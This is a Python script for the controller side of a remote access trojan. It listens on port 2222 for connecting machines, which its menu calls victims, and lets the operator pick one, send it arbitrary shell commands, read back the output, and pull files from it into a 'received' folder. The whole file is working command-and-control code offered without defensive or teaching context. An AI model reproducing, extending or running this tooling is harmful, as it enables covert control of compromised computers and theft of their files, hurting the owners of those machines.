#!/usr/bin/python3
import socket
import threading
import sys
import os
import uuid

HOST = socket.gethostname()
PORT = 2222


def close_connections():

    with locking:
        for each in connections:
            each[0].shutdown(2)
            each[0].close()


def accept_connections():

    while True:
        socket, addr = s.accept()
        with locking:
            connections.append([socket, addr])


def file_transfer(client):

    name = uuid.uuid4().hex
    f = open("received/" + name, 'wb')

    while True:
        l = client[0].recv(4096)
        while (l):
            if l.endswith(bytes("EOFX", "UTF-8")):
                u = l[:-4]
                f.write(u)
                break
            else:
                f.write(l)
                l = client[0].recv(4096)
        break
    f.close()


def file_browser(client):

    client[0].sendall(bytes("1", "UTF-8"))
    client_pwd = client[0].recv(4096).decode("UTF-8")
    print(client_pwd)
    exit = False
    while not exit:
        command = input("Type a command: ")
        if command == "exit":
            client[0].sendall(bytes(command, "UTF-8"))
            exit = True
            os.system("clear")
        elif command == "clear":
            os.system("clear")
        else:
            client[0].sendall(bytes(command, "UTF-8"))
            aux = command.split("~")
            if aux[0] == "cp":
                file_transfer(client)
            recibi = client[0].recv(4096).decode("UTF-8")
            print(recibi)


def refresh_connections(locking, connections):

    index = 0
    with locking:
        for each in connections:
            print("%d)%s " % (index, each[1]))
            index += 1


def main():

    accept_thread = threading.Thread(target=accept_connections, daemon=True)
    accept_thread.start()

    while True:
        print("Items to do:\n")
        print("1) Refresh connections.")
        print("2) Inspect a victim.")
        print("0) Exit.\n")

        option = input("What u want to do? ")

        if option == "1":
            os.system('clear')
            refresh_connections(locking, connections)

        elif option == "2":
            client_id = input("Choose server: ")
            os.system('clear')
            with locking:
                try:
                    client = connections[int(client_id)]
                except IndexError:
                    print("Index does not exist.")
            file_browser(client)
        elif option == "0":
            close_connections()
            sys.exit(0)
        else:
            print("\nPerhaps you better start from the beginning.")
            input("")
            os.system("clear")


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(5)

locking = threading.Lock()
connections = []


if __name__ == "__main__":
    main()
